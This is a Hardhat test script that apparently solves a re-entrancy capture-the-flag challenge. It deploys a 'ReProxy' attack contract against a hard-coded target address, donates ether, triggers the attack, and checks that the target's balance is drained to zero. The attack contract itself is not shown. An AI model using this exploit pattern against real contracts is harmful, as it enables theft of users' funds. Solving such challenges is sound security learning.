import { ethers } from "hardhat";
import { expect } from "chai";


describe("reenterancy", function() {
    it("should solve re-enterancy challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        let targetABI = [
            "function balanceOf(address _who) public view returns (uint balance)",
            "function donate(address _to) public payable",
        ];

        const targetAddr = "0x7d4Ff2119dac0EbCf904615AB5C6c5815BDC6853";
        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        const proxyFactory = await ethers.getContractFactory("ReProxy");
        const proxyCont = await proxyFactory.deploy(targetAddr);
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash) ;
        console.log("ReProxy deployed at: " + proxyCont.deployTransaction.hash);

        // target's initial balance
        balance = await eoa.provider!.getBalance(targetAddr);
        console.log(ethers.utils.formatEther(balance));

        // donate 0.1 ether to exploit contract
        let tx = await targetCont.donate(proxyCont.address, { value: ethers.utils.parseEther("0.1") });
        await tx.wait();
        console.log(tx);

        // trigger the attack
        tx = await proxyCont.triggerAttack();
        await tx.wait();
        console.log(tx);

        // target's balance after attack
        balance = await eoa.provider!.getBalance(targetAddr);
        console.log(ethers.utils.formatEther(balance));

        expect(balance).to.eq(0);
    });
});